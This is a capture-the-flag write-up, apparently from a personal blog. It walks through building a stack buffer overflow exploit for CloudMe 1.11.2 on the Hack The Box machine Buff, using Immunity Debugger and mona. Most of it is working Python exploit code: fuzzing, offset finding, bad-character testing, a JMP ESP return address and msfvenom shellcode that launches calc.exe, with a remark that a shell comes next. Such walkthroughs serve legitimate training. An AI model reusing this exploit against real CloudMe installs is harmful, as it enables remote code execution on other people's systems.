---
layout: post
title: Buff HTB Buffer Overflow
categories: [OSCP, BOF]
---

If you played or read my walktrhough on Buff you know there is buffer overflow exploit as privileges escalation path to root/admin. I think most people do is find python exploit on exploit-db and use it. I decide to recreate this script and did whole attack as I think was supposed to be when this box was released.

We find CloudMe version 1.11.2 which has bug for buffer overflow. Binary was on box so i decided to download it to my windows machine. I also install [immunity debuger](https://www.immunityinc.com/products/debugger/) and [mona](https://github.com/corelan/mona). Also install application from HTB machine. Lunch application and attach CloudMe process for monitoring. Do not forget start this process when load as application will by paused

![](/images/buff-bof/01-attach.png)


From exploit we know that we had to do connection to localhost on port 8888.

```powershell
PS C:\Users\kali\Downloads> .\nc.exe -vvv 127.0.0.1 8888
DESKTOP-MRV87VT [127.0.0.1] 8888 (?) open
```

We can start creating my python script. Python version is 2.7 as immunity debugger require have install python 2.7 . Was lazy to install python3.



```python
import socket

payload = 'A'* 1500 

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(('127.0.0.1',8888))
conn.send(payload)
conn.close()
```

Application just connect to TCP port on port 8888 and send lots of 'A's
When we inspect immunity debugger we noticed that EIP value is 41 (which is hex value of 'A'). That mean we can control this program. Mona was amazing feature to create pattern of any length

```powershell
!mona pc 1500
```

It will create file pattern.txt . I replace this pattern with my 'A's and relaunch Cloud Me and attach immunity debugger. Execute script

```python
payload = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9' 
```

We now start looking on which offset EIP will execute. We use mona again.

```powershell
!mona findmsp -distance 1500
```

![](/images/buff-bof/03-offset.png)

We noticed that offset start at 1052. We adjust our script again 

```python
payload = 'A'* 1052 + 'BBBB'  + 444 *'C'
```

And inspect immunity debugger

![](/images/buff-bof/04-bbb.png)

As we can see EIP is 42 hex value or 'B'
Now we have to check for bad characters. Bad characters are the one that cause issue. We put back character right after our EIP address which is now all 'BBBB'. There are commonly known bad characters \x00(Null) and \xa0(Line Feed)

```python
import socket

buf = b''
buf += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
buf += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
buf += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
buf += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
buf += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
buf += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
buf += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
buf += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = 'A'* 1052 + 'BBBB'  + buf  

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(('127.0.0.1',8888))
conn.send(payload)
conn.close()
```

We inspect our stack to make sure no other bad character exist. Make sure all  character are showed properly.

With all this information we generate our shell code. 

```bash
msfvenom -p windows/windows_exec CMD=calc.exe -b '\x00,\x0A' -f python
```

this provided me shell code. Now I needed to find JUMP ESP address from one of modules. We search for one with all false options. 

![](/images/buff-bof/05-modules.png)

We look for '\xff\xe4' which mean JUMP ESP in one of these false DLL

```powershell
!mona find -s '\xff\xe4' -m  ssleay32.dll
```

![](/images\buff-bog/06-eip.png)

We have one potential pointer. We start creating our last script. 
It will contain bunch of 'A' them EIP address but reversed because of something called little endian. Them we placed "\x90" which is NOP instruction. Pointer and will continue to next address unit reach our payload in out case start calculator

```python  
import socket

eip = b'\xc7\xa3\x22\x6b'

buf =  b""
buf += b"\xdd\xc7\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x31\xbb\x37"
buf += b"\x99\xa8\xdc\x31\x5f\x18\x83\xef\xfc\x03\x5f\x23\x7b"
buf += b"\x5d\x20\xa3\xf9\x9e\xd9\x33\x9e\x17\x3c\x02\x9e\x4c"
buf += b"\x34\x34\x2e\x06\x18\xb8\xc5\x4a\x89\x4b\xab\x42\xbe"
buf += b"\xfc\x06\xb5\xf1\xfd\x3b\x85\x90\x7d\x46\xda\x72\xbc"
buf += b"\x89\x2f\x72\xf9\xf4\xc2\x26\x52\x72\x70\xd7\xd7\xce"
buf += b"\x49\x5c\xab\xdf\xc9\x81\x7b\xe1\xf8\x17\xf0\xb8\xda"
buf += b"\x96\xd5\xb0\x52\x81\x3a\xfc\x2d\x3a\x88\x8a\xaf\xea"
buf += b"\xc1\x73\x03\xd3\xee\x81\x5d\x13\xc8\x79\x28\x6d\x2b"
buf += b"\x07\x2b\xaa\x56\xd3\xbe\x29\xf0\x90\x19\x96\x01\x74"
buf += b"\xff\x5d\x0d\x31\x8b\x3a\x11\xc4\x58\x31\x2d\x4d\x5f"
buf += b"\x96\xa4\x15\x44\x32\xed\xce\xe5\x63\x4b\xa0\x1a\x73"
buf += b"\x34\x1d\xbf\xff\xd8\x4a\xb2\x5d\xb6\x8d\x40\xd8\xf4"
buf += b"\x8e\x5a\xe3\xa8\xe6\x6b\x68\x27\x70\x74\xbb\x0c\x8e"
buf += b"\x3e\xe6\x24\x07\xe7\x72\x75\x4a\x18\xa9\xb9\x73\x9b"
buf += b"\x58\x41\x80\x83\x28\x44\xcc\x03\xc0\x34\x5d\xe6\xe6"
buf += b"\xeb\x5e\x23\x85\x6a\xcd\xaf\x64\x09\x75\x55\x79"

payload = 'A'* 1052 + eip + 50* b'\x90' + buf  

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(('127.0.0.1',8888))
conn.send(payload)
conn.close()
```

We try it. And we have our calculator

![](/images/buff-bof/07-calc.png)

We have our command execution. Now we can execute our shell 
